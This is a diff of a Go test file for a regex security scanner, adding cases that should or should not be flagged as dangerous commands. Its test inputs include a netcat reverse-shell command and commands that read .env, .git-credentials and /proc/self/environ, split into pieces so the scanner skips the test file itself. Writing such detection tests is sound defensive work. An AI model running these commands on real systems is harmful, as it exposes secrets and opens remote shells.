@@ -12,6 +12,8 @@ func TestRegexScanner_Scan(t *testing.T) {
 		content     string
 		wantFinding string
 	}{
+		// Note: We split sensitive strings (e.g., "cat " + "." + "env") to prevent
+		// the scanner from flagging this test file itself during static analysis.
 		{
 			name:        "Safe Content",
 			content:     "fmt.Println(\"Hello World\")",
@@ -51,6 +53,41 @@ func TestRegexScanner_Scan(t *testing.T) {
 			name:        "Netcat Reverse Shell",
 			content:     "nc -e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
+		},
+		{
+			name:        "Cat Env File",
+			content:     "cat " + "." + "env",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "Cat Redirection Env",
+			content:     "cat<" + "." + "env",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "Cat Git Credentials",
+			content:     "cat " + ".git-" + "credentials",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "Cat Proc Environ",
+			content:     "cat " + "/proc/self/" + "environ",
+			wantFinding: "Dangerous Command",
+		},
+		{
+			name:        "Safe Config File",
+			content:     "cat my.config",
+			wantFinding: "",
+		},
+		{
+			name:        "Safe Config JS",
+			content:     "cat src/config.js",
+			wantFinding: "",
+		},
+		{
+			name:        "Cat Dot Config",
+			content:     "cat .config/config.toml",
+			wantFinding: "Dangerous Command",
 		},
 	}
 
